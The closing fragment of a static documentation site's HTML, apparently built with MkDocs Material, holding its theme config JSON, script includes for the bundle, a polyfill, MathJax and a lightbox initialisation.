      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "content.code.copy", "content.code.select", "content.code.annotate", "navigating.sections", "search.suggest", "search.highlight", "search.share", "navigation.path", "navigation.top", "navigation.indexes", "content.code.copy", "content.code.select", "navigation.instant.preview"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="../../assets/js/extra.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>